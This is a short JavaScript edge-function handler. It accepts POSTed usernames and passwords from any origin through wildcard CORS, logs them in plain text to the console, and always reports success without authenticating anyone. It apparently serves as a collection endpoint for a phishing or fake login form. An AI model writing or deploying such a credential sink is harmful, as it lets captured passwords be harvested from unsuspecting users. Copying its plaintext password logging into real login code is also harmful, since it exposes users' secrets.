export const config = {
  runtime: 'edge',
};

export default async function handler(req) {
  // CORS headers
  const { headers, method } = req;
  if (method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST,OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  }

  if (method === 'POST') {
    const { username, password } = await req.json();
    console.log('Nhận form:', { username, password });
    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { 'Access-Control-Allow-Origin': '*' },
    });
  }

  return new Response('Method Not Allowed', { status: 405 });
}
